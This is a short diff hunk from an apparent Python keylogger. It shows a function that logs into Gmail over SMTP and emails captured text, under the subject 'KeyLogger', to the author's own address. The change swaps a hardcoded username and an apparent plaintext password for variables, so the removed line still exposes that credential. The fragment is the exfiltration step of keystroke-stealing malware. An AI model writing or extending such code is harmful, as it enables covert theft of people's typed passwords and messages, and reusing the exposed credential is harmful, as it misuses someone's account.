@@ -10,7 +10,7 @@ def send_email(text):
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.ehlo()
     s.starttls()
-    s.login("bferchesa", "12345budincutze")
+    s.login(USERNAME, PASS)
     msg = 'Subject: {}\n\n{}'.format("KeyLogger", text)
     s.sendmail("bferchesa@gmail.com", "bferchesa@gmail.com", str(msg))
     s.quit()
